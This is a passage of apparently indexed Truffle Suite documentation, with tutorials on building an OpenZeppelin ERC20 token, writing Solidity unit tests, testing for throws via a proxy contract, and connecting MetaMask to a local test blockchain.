; contract TutorialToken is ERC20 { } Things to notice: Beyond the standard smart contract setup, we import the StandardToken.sol contract and declare our TutorialToken . We use is to inherit from the StandardToken contract. Our contract will inherit all variables and functions from the StandardToken contract. Inherited functions and variables can be overwritten by redeclaring them in the new contract. To set our own parameters for the token, we'll be declaring our own name, symbol, and other details. Add the following content block to the contract (between the curly braces): string public name = \"TutorialToken\" ; string public symbol = \"TT\" ; uint8 public decimals = 2 ; uint public INITIAL_SUPPLY = 12000 ; Things to notice: The name and symbol variables give our token a unique identity. The decimals variable determines the degree to which this token can be subdivided. For our example we went with 2 decimal places, similar to dollars and cents. The INITIAL_SUPPLY variable determines the number of tokens created when this contract is deployed. In this case, the number is arbitrary. To finish up our contract, we'll create a constructor function to mint with the totalSupply equal to our declared INITIAL_SUPPLY and give the entire supply to the deploying account's address. Add this block below the content added in the previous step: constructor () public { _mint ( msg.sender , INITIAL_SUPPLY ); } Using less than 15 lines of hand-coded Solidity, we've created our own Ethereum token! Compiling and deploying the smart contract \u00b6 In the migrations/ directory, create the file 2_deploy_contracts.js and add the following content: var TutorialToken = artifacts . require ( \"TutorialToken\" ); module . exports = function ( deployer ) { deployer . deploy ( TutorialToken ); }; The import statement within our TutorialToken contract will be automatically handled by the compiler, along with any subsequent imports within StandardToken . Now we are ready to compile and deploy your contract to the blockchain. For this tutorial, we will use Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. If you haven't already, download Ganache and double click the icon to launch the application. This will generate a blockchain running locally on port 7545. **Note**: Read more about Ganache in the [Truffle documentation](/docs/ganache/using). With our blockchain launched, head back to your terminal. Inside your project, run the following command to compile the contract: truffle compile Note : If you're on Windows and encountering problems running this command, please see the documentation on [resolving naming conflicts on Windows](/docs/advanced/configuration#resolving-naming-conflicts-on-windows). Once the compile has completed, deploy the contract to the blockchain: truffle migrate You will see output that looks similar to this: Using network 'development' . Running migration: 1_initial_migration.js Deploying Migrations... ... 0xa4470beb31f490e26b9a8b0d677cb7107ae5ef5bf40f8ee59fe040d35ca4f598 Migrations: 0x8cdaf0cd259887258bc13a92c0a6da92698644c0 Saving successful migration to network... ... 0xd7bc86d31bee32fa3988f1c1eabce403a1b5d570340a3a9cdba53a472ee8c956 Saving artifacts... Running migration: 2_deploy_contracts.js Deploying TutorialToken... ... 0xcc01dcbe77f79cf4c21e5642bfee50a6db78b7d6dedb9f8b363ec4110e92436d TutorialToken: 0x345ca3e014aaf5dca488057592ee47305d9b3e10 Saving successful migration to network... ... 0xf36163615f41ef7ed8f4a8f192149a0bf633fe1a2398ce001bf44c43dc7bdda0 Saving artifacts... Ganache will also list these transactions as well. Interacting with the new token \u00b6 For this portion of the tutorial, we recommend using MetaMask , a browser extension for Chrome and Firefox. It will allow you to switch between accounts quickly, perfect for testing the ability to transfer our newly created tokens. Our Pet Shop tutorial has more information about configuring MetaMask . You will want to enter the mnemonic displayed in Ganache into MetaMask, and make sure that MetaMask is listening to the Custom RPC http://127.0.0.1:7545 . **Warning**: Do not use the Main Network in MetaMask. If you send ether to any account generated from Ganache's default mnemonic, you will lose it all! Still in your terminal, run a local web server containing the front-end application: npm run dev A browser window should automatically open with the interface below: Our basic dapp shows the TutorialToken balance of the selected account in MetaMask. Now we'll transfer some TutorialToken tokens to a different account. Ganache, when launched, lists 10 accounts. The first account has the token balance. Pick one of the other accounts (we recommend the second account) and enter it in the \"Address\" box, and also enter 2000 in the \"Amount\" field. Click \"Transfer\" to initiate the token transfer. MetaMask will intercept the transfer request and display a confirmation. Note that no ether is changing hands, except for the gas used to pay for the transaction. Click \"Submit\" and the transfer will proceed. If all goes well, you will see a window saying \"Transfer successful\". You will also see a record of the transaction in MetaMask, and a new transaction will be displayed at the top of the \"Transactions\" section in Ganache. Still in MetaMask, switch from the first account to the second one (you may need to select \"Create an account\" if only one account is in the list.) Now refresh the app in your browser. It will be connected to the currently selected account in MetaMask, and display the amount of tokens (in this case, 2000 TT). This shows that the transfer did in fact succeed. Try sending different amount of tokens to different accounts to practice how our dapp (and MetaMask) interacts with the network. We at Truffle are excited to see companies like Zeppelin Solutions contributing to the standardization and increased security of smart contracts. With OpenZeppelin's contracts and Truffle's tools, you have everything you need to start creating industry-standard distributed applications. Happy coding!","title":"Truffle Suite"},{"location":"guides/robust-smart-contracts-with-openzeppelin/index.html#requirements","text":"This tutorial expects you to have some knowledge of Truffle, Ethereum, and Solidity. If you haven't gone through our Ethereum overview and our Pet Shop tutorial yet, those would be great places to start. For even more information, please see the following links: Truffle documentation Ethereum Solidity documentation We will primarily be using the command line for this tutorial, so please ensure you have basic familiarity with your operating system's terminal.","title":"Requirements"},{"location":"guides/robust-smart-contracts-with-openzeppelin/index.html#overview","text":"In this tutorial we will be covering: Unboxing the front-end application Creating the \"TutorialToken\" smart contract Compiling and deploying the smart contract Interacting with the new token","title":"Overview"},{"location":"guides/robust-smart-contracts-with-openzeppelin/index.html#unboxing-the-front-end-application","text":"In this tutorial, we are focusing on smart contract creation. To that end, we've created the front-end for you in the form of a Truffle Box. On a terminal, create a project directory and navigate to it: mkdir oz-workspace cd oz-workspace Unbox the tutorialtoken Truffle Box. This will give us our project template. truffle unbox tutorialtoken Next, we'll install OpenZeppelin. The most recent version of OpenZeppelin can be found as an npm package. npm install openzeppelin-solidity","title":"Unboxing the front-end application"},{"location":"guides/robust-smart-contracts-with-openzeppelin/index.html#creating-the-tutorialtoken-smart-contract","text":"With our front-end taken care of, we can focus on the TutorialToken contract. In the contracts/ directory of your Truffle Box, create the file TutorialToken.sol and add the following contents: pragma solidity ^ 0.4.24 ; import \"openzeppelin-solidity/contracts/token/ERC20/ERC20.sol\" ; contract TutorialToken is ERC20 { } Things to notice: Beyond the standard smart contract setup, we import the StandardToken.sol contract and declare our TutorialToken . We use is to inherit from the StandardToken contract. Our contract will inherit all variables and functions from the StandardToken contract. Inherited functions and variables can be overwritten by redeclaring them in the new contract. To set our own parameters for the token, we'll be declaring our own name, symbol, and other details. Add the following content block to the contract (between the curly braces): string public name = \"TutorialToken\" ; string public symbol = \"TT\" ; uint8 public decimals = 2 ; uint public INITIAL_SUPPLY = 12000 ; Things to notice: The name and symbol variables give our token a unique identity. The decimals variable determines the degree to which this token can be subdivided. For our example we went with 2 decimal places, similar to dollars and cents. The INITIAL_SUPPLY variable determines the number of tokens created when this contract is deployed. In this case, the number is arbitrary. To finish up our contract, we'll create a constructor function to mint with the totalSupply equal to our declared INITIAL_SUPPLY and give the entire supply to the deploying account's address. Add this block below the content added in the previous step: constructor () public { _mint ( msg.sender , INITIAL_SUPPLY ); } Using less than 15 lines of hand-coded Solidity, we've created our own Ethereum token!","title":"Creating the \"TutorialToken\" smart contract"},{"location":"guides/robust-smart-contracts-with-openzeppelin/index.html#compiling-and-deploying-the-smart-contract","text":"In the migrations/ directory, create the file 2_deploy_contracts.js and add the following content: var TutorialToken = artifacts . require ( \"TutorialToken\" ); module . exports = function ( deployer ) { deployer . deploy ( TutorialToken ); }; The import statement within our TutorialToken contract will be automatically handled by the compiler, along with any subsequent imports within StandardToken . Now we are ready to compile and deploy your contract to the blockchain. For this tutorial, we will use Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. If you haven't already, download Ganache and double click the icon to launch the application. This will generate a blockchain running locally on port 7545. **Note**: Read more about Ganache in the [Truffle documentation](/docs/ganache/using). With our blockchain launched, head back to your terminal. Inside your project, run the following command to compile the contract: truffle compile Note : If you're on Windows and encountering problems running this command, please see the documentation on [resolving naming conflicts on Windows](/docs/advanced/configuration#resolving-naming-conflicts-on-windows). Once the compile has completed, deploy the contract to the blockchain: truffle migrate You will see output that looks similar to this: Using network 'development' . Running migration: 1_initial_migration.js Deploying Migrations... ... 0xa4470beb31f490e26b9a8b0d677cb7107ae5ef5bf40f8ee59fe040d35ca4f598 Migrations: 0x8cdaf0cd259887258bc13a92c0a6da92698644c0 Saving successful migration to network... ... 0xd7bc86d31bee32fa3988f1c1eabce403a1b5d570340a3a9cdba53a472ee8c956 Saving artifacts... Running migration: 2_deploy_contracts.js Deploying TutorialToken... ... 0xcc01dcbe77f79cf4c21e5642bfee50a6db78b7d6dedb9f8b363ec4110e92436d TutorialToken: 0x345ca3e014aaf5dca488057592ee47305d9b3e10 Saving successful migration to network... ... 0xf36163615f41ef7ed8f4a8f192149a0bf633fe1a2398ce001bf44c43dc7bdda0 Saving artifacts... Ganache will also list these transactions as well.","title":"Compiling and deploying the smart contract"},{"location":"guides/robust-smart-contracts-with-openzeppelin/index.html#interacting-with-the-new-token","text":"For this portion of the tutorial, we recommend using MetaMask , a browser extension for Chrome and Firefox. It will allow you to switch between accounts quickly, perfect for testing the ability to transfer our newly created tokens. Our Pet Shop tutorial has more information about configuring MetaMask . You will want to enter the mnemonic displayed in Ganache into MetaMask, and make sure that MetaMask is listening to the Custom RPC http://127.0.0.1:7545 . **Warning**: Do not use the Main Network in MetaMask. If you send ether to any account generated from Ganache's default mnemonic, you will lose it all! Still in your terminal, run a local web server containing the front-end application: npm run dev A browser window should automatically open with the interface below: Our basic dapp shows the TutorialToken balance of the selected account in MetaMask. Now we'll transfer some TutorialToken tokens to a different account. Ganache, when launched, lists 10 accounts. The first account has the token balance. Pick one of the other accounts (we recommend the second account) and enter it in the \"Address\" box, and also enter 2000 in the \"Amount\" field. Click \"Transfer\" to initiate the token transfer. MetaMask will intercept the transfer request and display a confirmation. Note that no ether is changing hands, except for the gas used to pay for the transaction. Click \"Submit\" and the transfer will proceed. If all goes well, you will see a window saying \"Transfer successful\". You will also see a record of the transaction in MetaMask, and a new transaction will be displayed at the top of the \"Transactions\" section in Ganache. Still in MetaMask, switch from the first account to the second one (you may need to select \"Create an account\" if only one account is in the list.) Now refresh the app in your browser. It will be connected to the currently selected account in MetaMask, and display the amount of tokens (in this case, 2000 TT). This shows that the transfer did in fact succeed. Try sending different amount of tokens to different accounts to practice how our dapp (and MetaMask) interacts with the network. We at Truffle are excited to see companies like Zeppelin Solutions contributing to the standardization and increased security of smart contracts. With OpenZeppelin's contracts and Truffle's tools, you have everything you need to start creating industry-standard distributed applications. Happy coding!","title":"Interacting with the new token"},{"location":"guides/solidity-unit-tests/index.html","text":"This is a beta document and refers to the beta version of Truffle. The following features will not work unless you are using Truffle Beta. Get the Beta Version \u00b6 As this feature is in beta, you must first get the beta version of Truffle. To make sure the beta version doesn't conflict with the released version, first remove the Truffle version you have currently installed: $ npm uninstall -g truffle And then install the beta version: $ npm install -g truffle@beta Overview \u00b6 Solidity test contracts live alongside Javascript tests as .sol files. When truffle test is run, they will be included in the mocha run with a separate test suite per test contract. These contracts maintain all the benefits of the Javascript tests: namely a clean slate per test suite, access to deployed contracts via migrations, runnable on any Ethereum client, and usage of snapshot/revert features (if supported by your Ethereum client) for increased speed. An example solidity unit test looks like this: import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MetaCoin.sol\" ; contract TestMetacoin { function testInitialBalanceUsingDeployedContract () { MetaCoin meta = MetaCoin ( DeployedAddresses . MetaCoin ()); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } function testInitialBalanceWithNewMetaCoin () { MetaCoin meta = new MetaCoin (); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } } And when running the test: $ truffle test Compiling ConvertLib.sol... Compiling MetaCoin.sol... Compiling ../test/TestMetacoin.sol... TestMetacoin \u2713 testInitialBalanceUsingDeployedContract ( 61ms ) \u2713 testInitialBalanceWithNewMetaCoin ( 69ms ) 2 passing ( 3s ) There are some very important structural items to discuss: First, your assertion functions are provided by the truffle/Assert.sol library. This is the default assertion library, however you can include your own assertion library so long as the library outputs the correct events to the test runner. You can find all available assertion functions in Assert.sol . These functions are meant to mimic those available in your Javascript tests, and more documentation will be written about each function in the future. The addresses of your deployed contracts (contracts that were deployed in your migration) are available through the truffle/DeployedAddresses.sol library. This is provided by Truffle and is recompiled and relinked before each suite is run to provide your tests with a clean slate deployment. This library provides functions for all of your deployed contracts, in the form of: DeployedAddresses . < contract name > (); This will return an address that you can then use to access that contract. In order to use the deployed contract, you'll have to import the contract code first. Notice import \"../contracts/MetaCoin.sol\"; in the example. This import is relative to the test contract, which exists in the ./test directory, and it goes outside of the test directory in order to find the MetaCoin contract. It then uses that contract in a test function below to cast the address to the MetaCoin type. All test contracts must start with Test , using an uppercase T . This distinguishes this contract apart from test helpers and project contracts, letting the test runner know it represents a test contract. Like test contract names, all test functions must start with test , all lowercase. Each test function is executed as a single transaction, in order of appearance in the test file (like your Javascript tests). Assertion functions provided by truffle/Assert.sol trigger events that the test runner evaluates to determine the result of the test. Assertion functions return a boolean representing the outcome of the assertion which you can use to return from the test early to prevent execution errors. You are provided many test hooks, shown in the example below. These hooks are beforeAll , beforeEach , afterAll and afterEach , which are the same hooks provided by mocha in your Javascript tests. You can use these hooks to perform setup and teardown actions before and after each test, or before and after each suite is run. Like test functions, each hook is executed as a single transaction. Note that some complex tests will need to perform a significant amount of setup that might overflow the gas limit of a single transaction; you can get around this limitation by creating many hooks with different suffixes, like in the example test below: import \"truffle/Assert.sol\" ; contract TestHooks { uint someValue ; function beforeEach () { someValue = 5 ; } function beforeEachAgain () { someValue += 1 ; } function testSomeValueIsSix () { uint expected = 6 ; Assert . equal ( someValue , expected , \"someValue should have been 6\" ); } } This test contract also shows that your test functions and hook functions all share the same contract state. You can setup contract data before the test, use that data during the test, and reset it afterward in preparation for the next one. Note that just like your Javascript tests, your next test function will continue from the state of the previous test function that ran. You do not need to extend from any Test contract like in other solidity testing frameworks. This is to make writing solidity unit tests easier, and should allow for more extensibility in the future with less hassle. Like Javascript tests, failing tests return the events that were fired (minus assertion events) so you can get a better sense of how your contracts-under-test performed.","title":"Truffle Suite"},{"location":"guides/solidity-unit-tests/index.html#get-the-beta-version","text":"As this feature is in beta, you must first get the beta version of Truffle. To make sure the beta version doesn't conflict with the released version, first remove the Truffle version you have currently installed: $ npm uninstall -g truffle And then install the beta version: $ npm install -g truffle@beta","title":"Get the Beta Version"},{"location":"guides/solidity-unit-tests/index.html#overview","text":"Solidity test contracts live alongside Javascript tests as .sol files. When truffle test is run, they will be included in the mocha run with a separate test suite per test contract. These contracts maintain all the benefits of the Javascript tests: namely a clean slate per test suite, access to deployed contracts via migrations, runnable on any Ethereum client, and usage of snapshot/revert features (if supported by your Ethereum client) for increased speed. An example solidity unit test looks like this: import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MetaCoin.sol\" ; contract TestMetacoin { function testInitialBalanceUsingDeployedContract () { MetaCoin meta = MetaCoin ( DeployedAddresses . MetaCoin ()); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } function testInitialBalanceWithNewMetaCoin () { MetaCoin meta = new MetaCoin (); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } } And when running the test: $ truffle test Compiling ConvertLib.sol... Compiling MetaCoin.sol... Compiling ../test/TestMetacoin.sol... TestMetacoin \u2713 testInitialBalanceUsingDeployedContract ( 61ms ) \u2713 testInitialBalanceWithNewMetaCoin ( 69ms ) 2 passing ( 3s ) There are some very important structural items to discuss: First, your assertion functions are provided by the truffle/Assert.sol library. This is the default assertion library, however you can include your own assertion library so long as the library outputs the correct events to the test runner. You can find all available assertion functions in Assert.sol . These functions are meant to mimic those available in your Javascript tests, and more documentation will be written about each function in the future. The addresses of your deployed contracts (contracts that were deployed in your migration) are available through the truffle/DeployedAddresses.sol library. This is provided by Truffle and is recompiled and relinked before each suite is run to provide your tests with a clean slate deployment. This library provides functions for all of your deployed contracts, in the form of: DeployedAddresses . < contract name > (); This will return an address that you can then use to access that contract. In order to use the deployed contract, you'll have to import the contract code first. Notice import \"../contracts/MetaCoin.sol\"; in the example. This import is relative to the test contract, which exists in the ./test directory, and it goes outside of the test directory in order to find the MetaCoin contract. It then uses that contract in a test function below to cast the address to the MetaCoin type. All test contracts must start with Test , using an uppercase T . This distinguishes this contract apart from test helpers and project contracts, letting the test runner know it represents a test contract. Like test contract names, all test functions must start with test , all lowercase. Each test function is executed as a single transaction, in order of appearance in the test file (like your Javascript tests). Assertion functions provided by truffle/Assert.sol trigger events that the test runner evaluates to determine the result of the test. Assertion functions return a boolean representing the outcome of the assertion which you can use to return from the test early to prevent execution errors. You are provided many test hooks, shown in the example below. These hooks are beforeAll , beforeEach , afterAll and afterEach , which are the same hooks provided by mocha in your Javascript tests. You can use these hooks to perform setup and teardown actions before and after each test, or before and after each suite is run. Like test functions, each hook is executed as a single transaction. Note that some complex tests will need to perform a significant amount of setup that might overflow the gas limit of a single transaction; you can get around this limitation by creating many hooks with different suffixes, like in the example test below: import \"truffle/Assert.sol\" ; contract TestHooks { uint someValue ; function beforeEach () { someValue = 5 ; } function beforeEachAgain () { someValue += 1 ; } function testSomeValueIsSix () { uint expected = 6 ; Assert . equal ( someValue , expected , \"someValue should have been 6\" ); } } This test contract also shows that your test functions and hook functions all share the same contract state. You can setup contract data before the test, use that data during the test, and reset it afterward in preparation for the next one. Note that just like your Javascript tests, your next test function will continue from the state of the previous test function that ran. You do not need to extend from any Test contract like in other solidity testing frameworks. This is to make writing solidity unit tests easier, and should allow for more extensibility in the future with less hassle. Like Javascript tests, failing tests return the events that were fired (minus assertion events) so you can get a better sense of how your contracts-under-test performed.","title":"Overview"},{"location":"guides/testing-for-throws-in-solidity-tests/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! NOTE : This tutorial is written for versions of Solidity prior to v0.4.13. It relies on the deprecated `throw` keyword, now replaced by `revert()`, `require()`, and `assert()`. See Solidity documentation for error handling for more information. Truffle 3 brings forth Solidity unit testing, which means one can now test contracts in Solidity itself. This is a boon to contract developers, as there are several reasons why it's useful to have Solidity tests in addition to Truffle\u2019s Javascript tests. For us at Ujo , one of our biggest concerns is testing how contracts interact with each other, rather than just testing their interaction from a web3 perspective, and Solidity tests allow us to do that. Though Solidity tests can be quite powerful, they do come with some drawbacks. One of those is testing whether or not a function should throw (without breaking the test!), which I'll show you how to do right now. Diving In \u00b6 In Solidity, when performing a contract call that produces an error, Solidity automatically rethrows, meaning it will bubble that error up to the caller. However, with a raw call, the behavior is different: one can catch the error and decide what to do from there on out. If it throws (fails), it will return false . If it succeeds, it will return true . Thus, the following calls will produce a different result. // Returns false bool result = address . call ( bytes4 ( bytes32 ( sha3 ( \u201c functionThatThrows () \u201d )))); // Returns true bool result = address . call ( bytes4 ( bytes32 ( sha3 ( \u201c functionThatDoesNotThrow () \u201d )))); When calls are made this way, even if a sub-call fails, it won\u2019t automatically rethrow. In order to test for throws, one can either write out each call in the format above (which is cumbersome), or use a proxy contract to wrap the contract call to a raw call and return whether it succeeded or not. For our purposes, let's look at the example below, similar to a method I saw used by Dapple in a Tester contract. Note that these contracts will likely be placed in separate files within your Truffle project. Here, Thrower is the contract you're testing to see whether or not certain contracts throw , ThrowProxy is our helper and TestThrower is our test contract. The code is as follows: import \"truffle/Assert.sol\" ; // Proxy contract for testing throws contract ThrowProxy { address public target ; bytes data ; function ThrowProxy ( address _target ) { target = _target ; } //prime the data using the fallback function. function () { data = msg.data ; } function execute () returns ( bool ) { return target . call ( data ); } } // Contract you're testing contract Thrower { function doThrow () { throw ; } function doNoThrow () { // } } // Solidity test contract, meant to test Thrower contract TestThrower { function testThrow () { Thrower thrower = new Thrower (); ThrowProxy throwProxy = new ThrowProxy ( address ( thrower )); //set Thrower as the contract to forward requests to. The target. //prime the proxy. Thrower ( address ( throwProxy )). doThrow (); //execute the call that is supposed to throw. //r will be false if it threw. r will be true if it didn't. //make sure you send enough gas for your contract method. bool r = throwProxy . execute . gas ( 200000 )(); Assert . isFalse ( r , \u201c Should be false , as it should throw \u201d ); } } Perhaps the most interesting line is the following: Thrower ( address ( throwProxy )). doThrow (); This is telling Solidity to call the doThrow() function at the throwProxy address. Solidity automatically creates the necessary message data ( msg.data ) based on this call. Writing it like this, one would assume that at throwProxy there is a Thrower contract, but there isn\u2019t. There's a proxy instead. The proxy then receives the msg data, and since it doesn\u2019t have a doThrow() function, the fallback function is triggered in its place. The fallback function then saves the message data. After that, when executing the proxy, it then forwards the request onwards as a raw call, not a contract call. Since the throw would use up all the gas, the rest of the tests would legitimately OOG, so we restrict the gas sent through when calling the execute() method. Note that enough should be sent through so that it doesn\u2019t OOG legitimately and thus miss the actual throw condition. With this proxy, one can still effectively write the interactions as contracts calling other contracts without having to resort to crafting raw calls manually. (Hooray!) Gotchas \u00b6 An important caveat here is to recognize the contract caller, msg.sender . If you add a proxy in between, then msg.sender will be the proxy, which could break authorization and permissioning algorithms. If your authorization system allows you to change the owner, you can get around this constraint by setting the proxy to be the contract owner. For example: // Assume our contract under test has a changeOwner() function thrower . changeOwner ( address ( throwProxy )); // Perform test functions and assertions // ... // Restore previous owner Thrower ( address ( throwProxy )). changeOwner ( address ( this )); throwProxy . execute (); It\u2019s also important to know that this only tests throw 's at this particular level. For instance, if your contract call structure looked like the following: Test -> Proxy -> ContractToTest -> SomeOtherContract -> AnotherContractThatThrows Then you wouldn\u2019t know where the throw occurred, since SomeOtherContract and ContractToTest could just rethrow. It would be prudent to also ensure there isn\u2019t anything faulty in the proxy by creating a second test as a control. This test should be called with the appropriate gas and use the proxy to test a function where no throw occurs, just to make sure the proxy is setup and working as intended. Because a throw essentially uses up all gas, one must make doubly sure they catch the throw and not a legitimate out-of-gas (OOG) error. As well, take care to manage sending Ether through the proxy (for tests that require it) as that can be difficult as well. Conclusion \u00b6 Testing throws is possible from within Solidity tests, but can be cumbersome if you want to write those tests yourself as raw calls. You can get around this by using a proxy contract, which makes many situations a lot easier and makes your tests much easier to write. But keep a look out for potential caveats as Solidity tests with a lot more power but plenty of drawbacks. Happy developing! About Simon de la Rouviere Simon builds decentralised applications for use in the music industry, online communities and the developing world. He has been in the Bitcoin/blockchain space since 2011, developed a decentralised band around a full blown cryptocurrency, and is writing a book on the blockchain. More about Simon can be found on consensys.net .","title":"Truffle Suite"},{"location":"guides/testing-for-throws-in-solidity-tests/index.html#diving-in","text":"In Solidity, when performing a contract call that produces an error, Solidity automatically rethrows, meaning it will bubble that error up to the caller. However, with a raw call, the behavior is different: one can catch the error and decide what to do from there on out. If it throws (fails), it will return false . If it succeeds, it will return true . Thus, the following calls will produce a different result. // Returns false bool result = address . call ( bytes4 ( bytes32 ( sha3 ( \u201c functionThatThrows () \u201d )))); // Returns true bool result = address . call ( bytes4 ( bytes32 ( sha3 ( \u201c functionThatDoesNotThrow () \u201d )))); When calls are made this way, even if a sub-call fails, it won\u2019t automatically rethrow. In order to test for throws, one can either write out each call in the format above (which is cumbersome), or use a proxy contract to wrap the contract call to a raw call and return whether it succeeded or not. For our purposes, let's look at the example below, similar to a method I saw used by Dapple in a Tester contract. Note that these contracts will likely be placed in separate files within your Truffle project. Here, Thrower is the contract you're testing to see whether or not certain contracts throw , ThrowProxy is our helper and TestThrower is our test contract. The code is as follows: import \"truffle/Assert.sol\" ; // Proxy contract for testing throws contract ThrowProxy { address public target ; bytes data ; function ThrowProxy ( address _target ) { target = _target ; } //prime the data using the fallback function. function () { data = msg.data ; } function execute () returns ( bool ) { return target . call ( data ); } } // Contract you're testing contract Thrower { function doThrow () { throw ; } function doNoThrow () { // } } // Solidity test contract, meant to test Thrower contract TestThrower { function testThrow () { Thrower thrower = new Thrower (); ThrowProxy throwProxy = new ThrowProxy ( address ( thrower )); //set Thrower as the contract to forward requests to. The target. //prime the proxy. Thrower ( address ( throwProxy )). doThrow (); //execute the call that is supposed to throw. //r will be false if it threw. r will be true if it didn't. //make sure you send enough gas for your contract method. bool r = throwProxy . execute . gas ( 200000 )(); Assert . isFalse ( r , \u201c Should be false , as it should throw \u201d ); } } Perhaps the most interesting line is the following: Thrower ( address ( throwProxy )). doThrow (); This is telling Solidity to call the doThrow() function at the throwProxy address. Solidity automatically creates the necessary message data ( msg.data ) based on this call. Writing it like this, one would assume that at throwProxy there is a Thrower contract, but there isn\u2019t. There's a proxy instead. The proxy then receives the msg data, and since it doesn\u2019t have a doThrow() function, the fallback function is triggered in its place. The fallback function then saves the message data. After that, when executing the proxy, it then forwards the request onwards as a raw call, not a contract call. Since the throw would use up all the gas, the rest of the tests would legitimately OOG, so we restrict the gas sent through when calling the execute() method. Note that enough should be sent through so that it doesn\u2019t OOG legitimately and thus miss the actual throw condition. With this proxy, one can still effectively write the interactions as contracts calling other contracts without having to resort to crafting raw calls manually. (Hooray!)","title":"Diving In"},{"location":"guides/testing-for-throws-in-solidity-tests/index.html#gotchas","text":"An important caveat here is to recognize the contract caller, msg.sender . If you add a proxy in between, then msg.sender will be the proxy, which could break authorization and permissioning algorithms. If your authorization system allows you to change the owner, you can get around this constraint by setting the proxy to be the contract owner. For example: // Assume our contract under test has a changeOwner() function thrower . changeOwner ( address ( throwProxy )); // Perform test functions and assertions // ... // Restore previous owner Thrower ( address ( throwProxy )). changeOwner ( address ( this )); throwProxy . execute (); It\u2019s also important to know that this only tests throw 's at this particular level. For instance, if your contract call structure looked like the following: Test -> Proxy -> ContractToTest -> SomeOtherContract -> AnotherContractThatThrows Then you wouldn\u2019t know where the throw occurred, since SomeOtherContract and ContractToTest could just rethrow. It would be prudent to also ensure there isn\u2019t anything faulty in the proxy by creating a second test as a control. This test should be called with the appropriate gas and use the proxy to test a function where no throw occurs, just to make sure the proxy is setup and working as intended. Because a throw essentially uses up all gas, one must make doubly sure they catch the throw and not a legitimate out-of-gas (OOG) error. As well, take care to manage sending Ether through the proxy (for tests that require it) as that can be difficult as well.","title":"Gotchas"},{"location":"guides/testing-for-throws-in-solidity-tests/index.html#conclusion","text":"Testing throws is possible from within Solidity tests, but can be cumbersome if you want to write those tests yourself as raw calls. You can get around this by using a proxy contract, which makes many situations a lot easier and makes your tests much easier to write. But keep a look out for potential caveats as Solidity tests with a lot more power but plenty of drawbacks. Happy developing! About Simon de la Rouviere Simon builds decentralised applications for use in the music industry, online communities and the developing world. He has been in the Bitcoin/blockchain space since 2011, developed a decentralised band around a full blown cryptocurrency, and is writing a book on the blockchain. More about Simon can be found on consensys.net .","title":"Conclusion"},{"location":"guides/truffle-and-metamask/index.html","text":"Update : Since this tutorial was published, we have released Ganache , a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our Ganache Documentation This article was originally written by Dan Finlay and published as a github gist . Dan has kindly allowed us to republish it here! If you're interested in building web apps with the Ethereum blockchain , you may have found the Truffle web framework to be a nice fit for your needs. For many types of Dapps (Distributed Apps), Truffle does everything you could want: It compiles your blockchain contracts, injects them into your web app, and can even run a test suite against them! This is all great for you, but what about your users? Truffle has some great defaults for users who are willing to run a local Ethereum JSON RPC server on their computer, but what about your users who just want to sign on and get started? With Metamask, all your users need to do is install our Chrome plugin , and they will have their own secure blockchain accounts right there in the convenience of their browsers. Metamask is just a Developer Preview right now, and has not been released to the general public. We don't recommend putting serious funds in it, but instead encourage you to use it to help prepare your dapps for Ethereum browsers. It's possible your Truffle Dapp is already compatible with Metamask, but if you're like me, you want to go through your project and see what it's like from your user's perspective. Just in case you haven't used Truffle before, I'm going to start by describing how to scaffold a minimal Truffle dapp. If you already have one set up, feel free to scroll ahead! Installing Truffle Dependencies \u00b6 You're going to need to have installed node.js . From there, you need to install truffle ( npm install -g truffle ). Also, you're going to need to run a local blockchain RPC server to test and develop against. I recommend using TestRPC , which you install by running npm install -g ethereumjs-testrpc . Next let's make sure we have our testrpc running in the background. Open your terminal and run the command testrpc . That's all! It runs on port 8545 by default, just like most Ethereum RPCs, and so does Truffle. Quick Note on RPCs \u00b6 Ethereum RPCs can run in a pre-authenticated mode, that allows you to perform transactions without providing any additional credentials. Obviously this would be a dangerous thing to do on the open web, but for local development, it's the default method that testrpc provides. When you first start testrpc , You get a list of initial accounts. These accounts start funded with a whole lot of Ether, so you can practice exchanging funds between accounts. When you open a normal Truffle Dapp, it takes advantage of your local authenticated rpc, and has access to its account list. The default Truffle dapp just uses the first account in the list. Setting up a Simple Truffle Dapp \u00b6 Next, let's generate a basic Truffle dapp. The default result of truffle init is a simple example currency. To get it up and running, run these commands: mkdir my-money # Create a folder for your new dapp cd my-money # Move into that folder truffle init # Initialize a default truffle project in that folder truffle build # Compile the dapp truffle migrate # Publish the dapp on the blockchain truffle serve # Host your web interface on port 8080 We just deployed a simple alt-coin called MetaCoin to our local blockchain, and it's available to our browser on http://127.0.0.1:8080 ! If you visit it, you'll see that by default this new Dapp template signs you in with the first account on your testrpc account list, which happens to be the same account that got pre-populated with 10k shiny new Metacoins! That's because when you ran truffle migrate , Truffle used your first account as the contract publisher, and the contract says to fund the creator's account with 10k coins. If you don't see any Metacoin in this account, it may be because you have Metamask already installed. Jump down to \"Switching between TestRPC and Metamask accounts\" below. You can now send those coins to any account you want, so let's now set up some Metamask accounts, and then we can fund them! Setting up Metamask \u00b6 Now you'll want to install Metamask from the Chrome store . Metamask is currently not listed on the Chrome store, but you get that link because you're an early adopter who we want to support. When first setting up Metamask, you'll need to provide a password (used to encrypt your wallet). It is then going to generate a unique twelve-word phrase that you'll eventually be able to use to recover all your accounts.We haven't done that yet because this is just a developer preview! Please don't use Metamask for important things yet! By default you get three accounts, all named Wallie. Again, our developer preview is showing. Eventually we're planning to integrate rich persona management via uPort !). To use Metamask with your local development blockchain, you need to point it at your testrpc . Open Metamask Click the gear icon in the bottom left Enter your testrpc address into the RPC field. It's probably http://127.0.0.1:8545/ . 